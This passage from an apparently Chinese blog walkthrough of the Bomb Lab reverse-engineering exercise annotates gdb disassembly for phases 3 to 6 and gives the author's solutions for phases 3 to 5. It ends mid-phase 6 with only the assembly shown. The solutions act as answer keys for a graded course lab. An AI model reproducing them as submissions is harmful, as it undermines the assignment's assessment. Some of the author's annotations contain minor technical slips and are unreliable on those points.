callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>首先调用了scanf函数，在调用之前有这样一个语句<code>mov $0x4025cf,%esi</code>，我们把0x4025cf的内容打印出来看看发现时%d %d说明<strong>需要读取两个整数</strong>。这样scanf函数的返回值才能是大于1的数。<code>0x8(%rsp)</code> 中存放第一个输入的数字 <code>0xc(%rsp）</code>存放第二个数字 。看到下面有很多个jmp，可以猜测是一个switch语句。</p>
<ol>
<li>输入两个整数完成后，接下来<code>cmpl $0x7,0x8(%rsp)</code> 判断7和输入的第一个数字的大小，如果大于爆炸，所以第一个数字应该小于7。把第一个数字赋值给%eax，然后跳转指令<code>jmpq *0x402470(, %rax, 8)</code>跳转到不同的分支。</li>
<li><code>jmpq *0x042470(, %rax, 8)</code>这个跳转指令比较难理解，首先把0x402470的内容打印出来看看： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x 0x402470</span><br><span class="line">0x402470: 	0x00400f7c</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>所以可以知道这个跳转实际上是调到了 0x0400f7c + 8 * rax的位置</p>
<ol>
<li>不同的分支都会对%eax进行赋值，然后跳转到+134行 比较(%rsp + 0xc)与eax的大小，如果相等则跳转到+134 解开炸弹。</li>
</ol>
<p>由于判断出来了第一个数字应该小于7，所以我调试时候尝试第一个数字为6，单步运行发现执行到了+92行，将0x2aa赋值给了%eax，然后跳转到+123行，然后对比第二个数字与0x2aa的大小。则可以得到6 682这个答案。 这道题答案不唯一，有6种可能。</p>
<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:	cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:	jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:	jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:	mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:	mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:	mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:	test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:	jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>首先看到scanf之前的参数，打印出0x4025cf的内容发现又是要求输入两个整数。输入成功后判断0xe与第一个输入的数字0x8(%rsp）比较，如果该数字小于等于0xe 则跳转到+46行。 把0xe赋值给%rdx, 把0x0赋值给%rsi, 再把输入的第一个数值赋值给%rdi， 然后调用func4函数。 </p>
<p>func4函数返回之后判断eax是否为0, 如果不是0则explode，如果是0则判断第二个输入参数是不是0，如果是则成功。 所以第二个整数应该0，第一个整数应该满足使func4函数的返回值为0</p>
<p>我们在看func4的汇编代码</p>
<p>注意cmp的两个操作数顺序是相反的  <code>cmpq %rsi, %rdi  jle fun</code>的含义是比较rsi和rdi大小，如果rdi &lt;= rsi则跳转到fun函数  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble func4</span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:	mov    %edx,%eax  # %rax = %rdx = 0xe</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:	sub    %esi,%eax  # %rax = %rax - %rsi = 0xe - 0x0 = 0xe</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:	mov    %eax,%ecx  # %rcx = %rax = 0xe</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:	shr    $0x1f,%ecx # %rcx = %rcx &gt;&gt; 32 = 0x0  ecx移动32位相当于清零</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:	add    %ecx,%eax  # %rax = %rax + %rcx = 0xe</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:	sar    %eax       # %rax = %rax &gt;&gt; 1 = 0x7  </span><br><span class="line">												  # 从开头到这里的操作等价于 %rax = (%rdx - %rsi) &gt;&gt; 1 </span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:	lea    (%rax,%rsi,1),%ecx	%rcx = %rax + #rsi = 0x7</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx  # 比较输入的第1个数字与0x7的大小</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt; # 如果 7 &lt;= num1 则跳转到+36</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:	lea    -0x1(%rcx),%edx # %rdx = %rcx - 1 = 0x6  如果输入的数字&lt;7则会把rdx 再次放入函数中递归</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:	jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax # 如果输入的数大于7 则会把rcx + 1 赋值给rsi，再次调用func函数</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:	lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:	lea    0x1(%rax,%rax,1),%eax # rax = rax * 2 + 1</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>实际上这是一个递归函数，要分三种情况。第一次进入func的时候rdx = 14, rsi = 0，所以rcx = 7，则x == 7时候会直接返回0， 满足我们的需求。 所以一个符合要求的答案就是<code>7 0</code>。 继续研究这个函数，我们可以发现第一句话实际上是在求rsi 和rdx 的平均值，然后把x和这个平均值对比，如果相等就返回0，如果<code>x&gt;mid</code>就取左区间，如果<code>x&lt;mid</code>就取右区间。那么实际上实现了 <strong>二分法</strong>，<strong>只有当输入的数x能在二分的过程中被取到的情况下才会返回0.</strong> 所以第一次会把区间分为<code>[8, 14]</code> 和<code>[0, 6]</code> 然后分别得到mid值为11, 3 然后再二分区间<code>[8, 10] [12 ,14] [0, 2] [4, 6]</code> 再分别得到mid值为9, 13, 1, 5 所以符合条件的解有1,3, 5,9, 11, 13<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> rdx = <span class="number">14</span>, <span class="keyword">int</span> rsi = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> rcx = (rdx - rsi) &gt;&gt; <span class="number">1</span> + rsi;  <span class="meta"># rcx = rsi + (rdx - rsi / 2)</span></span><br><span class="line">	<span class="keyword">if</span>(x == rcx) &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x &gt; rcx) &#123; <span class="keyword">return</span> func(x, rdx, rcx + <span class="number">1</span>);&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;<span class="keyword">return</span> func(x, rcx - <span class="number">1</span>, rsi);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然而我尝试了一下 可以通过的解有1 3 7 。这似乎是因为+53行 在二分法右区间执行完毕之后对rax 进行了<code>lea 0x1(%rax, %rax , 1), %eax</code>这样一个操作，相当于rax= rax * 2+1 所以所有走过右分支的数都不会返回1。而5是因为第一次搜索区间为[0,14] 第二次为[0,6] 第三次为[4,6]走到了右分支，所以不可以。</p>
<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">=&gt; 0x0000000000401062 &lt;+0&gt;:	push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:	sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:	mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:	mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:	mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:	xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:	cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:	je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:	jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:	mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:	mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:	and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:	add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:	cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:	jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:	movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:	mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:	lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:	test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:	je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:	nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:	jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:	jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:	mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:	xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:	je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:	callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:	add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:	pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>首先看到+24和+29行可以判断这应该是一个长度==6的字符串。输入完成后跳转到+112, 输入的字符地址存放在rax rbx rsi rdi三个寄存器中，把rax置0，跳转到+41, <code>movzbl (%rbx,%rax,1),%ecx</code> 把输入的第一个字符赋值给rcx 高位补0，比如我输入123456,执行完这句话 之后rcx的值为0x31。 接下来把rcx取最低4bit赋值给rdx，把rdx的低4bit存放在<code>0x10(%rsp,%rax,1)</code>地址中，然后给rax++，判断rax是否等于6，如果不相等则跳到+41继续循环。 可见这是一个do while语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rax = 0</span><br><span class="line">do &#123;</span><br><span class="line">    rcx = [rbx + rax * 1];   # 取输入的第rax个字符，比如输入123456，得到的第一个就是0x31</span><br><span class="line">	rdx = rcx &amp; 0x0000 000f; # 从0x31 得到0x01</span><br><span class="line">	rdx = [0x4024b0 + rdx]   # 从内存地址[0x4024b0]中得到第rdx个字符 赋值给rdx</span><br><span class="line">	把rdx 存到0x10(%rsp, %rax, 1)中</span><br><span class="line">	rax++;</span><br><span class="line">&#125;while(rax != 6)</span><br></pre></td></tr></table></figure></p>
<p>我们先来看一下[0x4024b0]中存放的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x4024b0</span><br><span class="line">$76 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure></p>
<p>可见这个循环执行的任务是 把输入的6个字符的低4bit映射到[0x4024b0]中，存到了以%rsp + 10起点的地址中。完成后把$0x40245e赋值给rsi,可以打印出该地址的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x40245e</span><br><span class="line">$66 = 0x40245e &quot;flyers&quot;</span><br></pre></td></tr></table></figure></p>
<p>然后将%rsp + 10赋值给rdi，调用strings_not_equal函数，所以我们可以知道 输入的字符串需要满足，变换后等于flyers 。 从上面0x4024b0中可以找到flyers分别对应(从0开始计算)下标第9,15,14,5,6,7 。因为这里需要输入的不是下标，而是一个字符，不能输入15和14，而要使用ascii码低4bit是F和E的两个字符，取?&gt; 故答案是<code>9?&gt;567</code></p>
<h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><p>最后一个长的吓人</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:	push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:	push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:	push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:	push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:	push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:	sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:	mov    %rsp,%r13  # r13 = rsp</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:	mov    %rsp,%rsi  # rsi = rsp</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:	mov    %rsp,%r14  # r14 = rsp</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:	mov    $0x0,%r12d # r12d = 0</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:	mov    %r13,%rbp  # rbp = r13 = rsp </span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:	mov    0x0(%r13),%eax # rax = (r13) 第一个数</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:	sub    $0x1,%eax  # rax = rax - 1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:	cmp    $0x5,%eax  # 比较rax 和 5</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:	jbe    0x401128 &lt;phase_6+52&gt; 如果 rax &lt;= 5则跳转 如果大于则爆炸</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:	add    $0x1,%r12d # r12d = r12d + 1</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:	cmp    $0x6,%r12d # 比较 r12d 和 6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:	je     0x401153 &lt;phase_6+95&gt; #如果r12d &lt; 6 就继续执行 =6则跳转到+95</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:	mov    %r12d,%ebx   # rbx = r12d</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:	movslq %ebx,%rax    # rax = rbx 扩充位数</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:	mov    (%rsp,%rax,4),%eax # rax = (rsp + rax * 4) 	取第r12d个数字</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:	cmp    %eax,0x0(%rbp) # 比较rax 和 （rbp）即第一个数</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:	jne    0x401145 &lt;phase_6+81&gt; # 如果相等则爆炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:	add    $0x1,%ebx  # rbx = rbx + 1 </span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:	cmp    $0x5,%ebx  # 比较rbx 和 5</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:	jle    0x401135 &lt;phase_6+65&gt; # 如果 rbx &lt;= 5 则跳转到+65 </span><br><span class="line">									   #从+65到+87的逻辑是检查后五个数和第一个数是否相等，如果有则爆炸 </span><br><span class="line">   0x000000000040114d &lt;+89&gt;:	add    $0x4,%r13 # r13 = r13 + 4</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:	jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">									   # 从+32到+93的逻辑是遍历，每个数都需要小于等于6，且不能有重复数字</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:	lea    0x18(%rsp),%rsi # rsi = rsp + 0x18 结束符</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:	mov    %r14,%rax # rax = r14 </span><br><span class="line">   0x000000000040115b &lt;+103&gt;:	mov    $0x7,%ecx # rcx = 7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:	mov    %ecx,%edx # rdx = rcx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:	sub    (%rax),%edx # rdx -= (rax)</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:	mov    %edx,(%rax) # (rax) = rdx  合起来就是(rax) = 7 - (rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:	add    $0x4,%rax # rax += 4</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:	cmp    %rsi,%rax # 对比rsi 和 rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:	jne    0x401160 &lt;phase_6+108&gt; # 如果不相等就继续循环</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:	mov    $0x0,%esi  # rsi = 0</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:	jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:	mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:	add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:	cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:	jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:	jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:	add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:	cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:	je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:	mov    (%rsp,%rsi,1),%ecx  # rcx = (rsp + rsi)</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:	cmp    $0x1,%ecx # 比较 rcx 和 1</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:	jle    0x401183 &lt;phase_6+143&gt; 如果rcx &lt;= 1 跳到+143</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:	jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:	mov    0x20(%rsp),%rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:	lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:	lea    0x50(%rsp),%rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:	mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:	mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:	mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:	add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:	cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:	je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:	mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:	jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:	movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:	mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:	mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:	mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:	jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:	mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:	sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:	jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:	add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:	pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:	pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:	pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:	pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:	pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:	retq</span><br></pre></td></tr></table></figure>
